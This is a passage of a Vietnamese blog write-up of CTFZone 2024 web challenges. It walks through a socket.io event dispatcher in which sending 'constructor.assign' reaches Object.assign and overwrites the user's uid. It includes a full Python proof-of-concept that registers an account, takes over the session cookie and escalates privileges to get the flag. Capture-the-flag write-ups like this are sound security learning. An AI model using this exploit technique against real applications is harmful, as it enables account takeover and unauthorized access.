+		return callback({ message: '[socket.io] Empty payload' });
+	}
+
+	var parts = eventName.toString().split('.');
+	var namespace = parts[0];
+	var methodToCall = parts.reduce(function (prev, cur) {
+		if (prev !== null &amp;&amp; prev[cur]) {
+			return prev[cur];
+		}
+		return null;
+	}, Namespaces);
+
+	if (!methodToCall) {
+		if (process.env.NODE_ENV === 'development') {
+			console.log('[socket.io] Unrecognized message: ' + eventName);
+		}
+		return callback({ message: '[[error:invalid-event]]' });
+	}
+
+	socket.previousEvents = socket.previousEvents || [];
+	socket.previousEvents.push(eventName);
+	if (socket.previousEvents.length &gt; 20) {
+		socket.previousEvents.shift();
+	}
+
+	if (ratelimit.isFlooding(socket)) {
+		console.log('[socket.io] Too many emits! Disconnecting uid : ' + socket.uid + '. Events : ' + socket.previousEvents);
+		return socket.disconnect();
+	}
+
+	async.waterfall([
+		function (next) {
+			if (Namespaces[namespace].before) {
+				Namespaces[namespace].before(socket, eventName, params, next);
+			} else {
+				next();
+			}
+		},
+		function (next) {
+			methodToCall(socket, params, next);
+		},
+	], function (err, result) {
+		console.log('result', err, result);
+		callback(err ? { message: err.message } : null, result);
+	});
+}
+</code></pre><p>Hàm này sẽ nhận socket, eventName, param, callback -&gt; đầu tiên thì sẽ check là kiểu của callback có phải func không nếu không thì sẽ là func -&gt; yêu cầu có <code>eventName</code> và <code>params</code></p>
+<p>Tiếp theo sẽ split eventName và gắn vào biến parts</p>
+<p><img src="https://hackmd.io/_uploads/ryRqkSvcA.png" alt="image"></p>
+<ul>
+<li>Chú ý Namespaces lúc này cũng đã được khởi tạo như ta đã mô tả</li>
+</ul>
+<p>Sau đó gắn</p>
+<p><img src="https://hackmd.io/_uploads/ryj4lBv5R.png" alt="image"></p>
+<p>Khởi tạo biến <code>methodToCall</code> bằng mảng part với method reduce với đối số là Namespaces</p>
+<p><img src="https://hackmd.io/_uploads/H1eKbHv5A.png" alt="image"></p>
+<p>Cuối cùng sẽ gọi lần lượt 2 hàm nằm trong này:</p>
+<pre><code>async.waterfall([
+		function (next) {
+			if (Namespaces[namespace].before) {
+				Namespaces[namespace].before(socket, eventName, params, next);
+			} else {
+				next();
+			}
+		},
+		function (next) {
+			methodToCall(socket, params, next);
+		},
+	], function (err, result) {
+		console.log('result', err, result);
+		callback(err ? { message: err.message } : null, result);
+	});
+</code></pre><p>Ta chỉ chú ý đến <code>methodToCall(socket, params, next);</code> như ở trên thấy thì methodToCall sẽ là một funcion trường hợp như này nó là:</p>
+<pre><code>function getInfo(socket, data, callback){
+    socket.emit('user.getInfo', {
+        success: true,
+        info: {
+            uname: socket.uname,
+            uid: socket.uid
+        }
+    });
+}
+</code></pre><p>Vậy là ta có thể control được methodToCall này nó là method nằm trong Namespace.</p>
+<p>Quay lại với Namespace được khởi tạo thì như ta biết trong js có tính kế thừa mà ta khởi tạo <code>Namespace = {}</code> thì nó kế thừa thuộc tính prototype của các base</p>
+<p><img src="https://hackmd.io/_uploads/r1p5ESvqC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Sy_pIHv5A.png" alt="image"></p>
+<p>Đối với hàm getFunny thì nó sẽ lấy uid của ta qua middleware socket và uid được lưu trong socket variable -&gt; vậy thì nếu mà ta thay đổi uid của mình thành 1 có được không</p>
+<p><img src="https://hackmd.io/_uploads/Bk3bdSwqR.png" alt="image"></p>
+<p>Quan sát lúc này socket chứa uid và username và ip của chúng ta</p>
+<p>Và trong js có một method có thể được dùng để copy</p>
+<p><img src="https://hackmd.io/_uploads/B1icOrw50.png" alt="image"></p>
+<p><code>sao chép các thuộc tính từ đối tượng trong tham số hai sang đối tượng trong tham số một và để nguyên tất cả các thuộc tính khác của đối tượng một</code></p>
+<p>Bây giờ ta sẽ dùng methodToCall ở trên để nó gọi <code>assign</code> với đối số đầu tiên là socket đối số thứ 2 là parameter ta truyền vào.</p>
+<p>Và ở đây chúng ta thấy cách có thể truy cập hàm gán thông qua Namespaces. Chúng ta có thể sử dụng cú pháp Namespaces['<strong>proto</strong>'][&lsquo;constructor&rsquo;][&lsquo;assign&rsquo;], hoặc phiên bản ngắn hơn Namespaces[&lsquo;constructor&rsquo;][&lsquo;assign&rsquo;]</p>
+<p><code>await communicate(&quot;constructor.assign&quot;, {&quot;uid&quot;: 1}, False)</code> ta thử gửi đến server</p>
+<p><img src="https://hackmd.io/_uploads/HksFcrwqA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SyejqSPc0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H1th5HDcA.png" alt="image"></p>
+<p>Như ta quan sát thì method to call lúc này đã là assign</p>
+<p><img src="https://hackmd.io/_uploads/S1uXiSwc0.png" alt="image"></p>
+<p>uid lúc này đang là 6</p>
+<p>Sau khi chạy methodToCall thì Namespace đã có method assign</p>
+<p><img src="https://hackmd.io/_uploads/HJ0RjSP50.png" alt="image"></p>
+<p>Lúc này uid của người dùng đã là 1</p>
+<p><img src="https://hackmd.io/_uploads/rkgvhBD5R.png" alt="image"></p>
+<p>Bây giờ chỉ cần emit button.get với data idButton là trong range(1,26) nữa và nhận flag.</p>
+<h3 id="exploit-local--real-server">exploit local + real server</h3>
+<p>poc:</p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/ctfZone2024/breathtaking-roulette$ cat e.py
+import socketio
+import asyncio
+import httpx
+import random
+import string
+
+
+BASE_URL = &quot;http://localhost&quot;
+#BASE_URL = &quot;http://funny-buttons.ctfz.zone&quot;
+
+
+def button_id():
+    return random.randint(1, 25)
+
+
+def random_string(length: int = 32):
+    return &quot;&quot;.join(random.choice(string.ascii_lowercase) for _ in range(length))
+
+
+async def main():
+    async with httpx.AsyncClient() as client:
+        user = random_string(8)
+        password = random_string(8)
+        rsp = await client.post(
+            f&quot;{BASE_URL}/register&quot;,
+            data={&quot;name&quot;: user, &quot;password&quot;: password},
+            follow_redirects=True
+        )
+        assert rsp.status_code == 200
+        rsp = await client.post(
+            f&quot;{BASE_URL}/login&quot;,
+            data={&quot;name&quot;: user, &quot;password&quot;: password},
+        )
+        print(client.cookies)
+
+    async with socketio.AsyncSimpleClient() as sio:
+        await sio.connect(
+            f'{BASE_URL}',
+            headers={
+                &quot;Cookie&quot;: f&quot;connect.sid={client.cookies['connect.sid']}&quot;,
+            },
+        )
+
+        async def communicate(msg: str, data, receive_response: bool = True):
+            print(f'Sending {msg} with {data = }')
+            await sio.emit(msg, data)
+            if receive_response:
+                method, resp = await sio.receive()
+                print(f'Received response for {method}: {resp}')
+                return resp
+            return None
+
+        await communicate(&quot;constructor.assign&quot;, {&quot;uid&quot;: 1}, False)
+        await communicate(&quot;user.getInfo&quot;, {})
+#        for uid in range(1, 26):
+#            resp = {'pressed': False}
+#            while not resp['pressed']:
+#                resp = await communicate(&quot;button.press&quot;, {&quot;id&quot;: uid})
+#                await communicate(&quot;button.get&quot;, {&quot;id&quot;: uid})
+
+        uid = 3
+        resp = {'pressed': False}
+        while not resp['pressed']:
+           resp = await communicate(&quot;button.press&quot;, {&quot;id&quot;: uid})
+        await communicate(&quot;button.get&quot;, {&quot;id&quot;: uid})
+
+
+if __name__ == '__main__':
+    asyncio.run(main())
+</code></pre><p>Mô tả poc đầu tiên sẽ reg new user với username và pass random tiếp theo sẽ đăng nhập và lấy ra session-id gắn vào header cookie để lấy phiên -&gt; prototype polution với <code>await communicate(&quot;constructor.assign&quot;, {&quot;uid&quot;: 1}, False)</code> và không nhận response từ socket -&gt; lấy thông tin người dùng xem đã thay đổi uid thành công hay chưa -&gt; press button nếu chưa press -&gt; cuối cùng là get funny từ button <code>communicate(&quot;button.get&quot;, {&quot;id&quot;: uid})</code> với uid là số thứ tự của button -&gt; do id button random nên ta sẽ chạy từ 1 đến 25.</p>
+<p><img src="https://hackmd.io/_uploads/SJmP7LvcC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1FtQUw90.png" alt="image"></p>
+<p>flag : <code>CTFZONE{y0u_just_pr3ss3d_v3ry_funny_butt0n_378b2b63-f818-45aa-9e84-3fdb1551fedf}</code></p>
+<h2 id="webbreathtaking-roulette">web/breathtaking-roulette</h2>
+<p>Bài này trông có vẻ như raceconditon và chall sử dụng websocket đến chơi gungun đối kháng và nếu mình thắng thì nhận flag</p>
+<p><img src="https://hackmd.io/_uploads/B1H_8Iv9C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1_NPUD5R.png" alt="image"></p>
+<p>spam và dành chiến thắng</p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://l3mnt2010.github.io/write-up/2024-03-09-cyberapocalypse2024/" data-toggle="tooltip" data-placement="top" title="Cyber Apocalypse 2024 - Solved &#39;s challenges in time">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://l3mnt2010.github.io/write-up/2024-07-27-corctf2024/" data-toggle="tooltip" data-placement="top" title="CorCTF2024 - WEB &#39;s challenges">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://l3mnt2010.github.io/">l3mnt2010&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
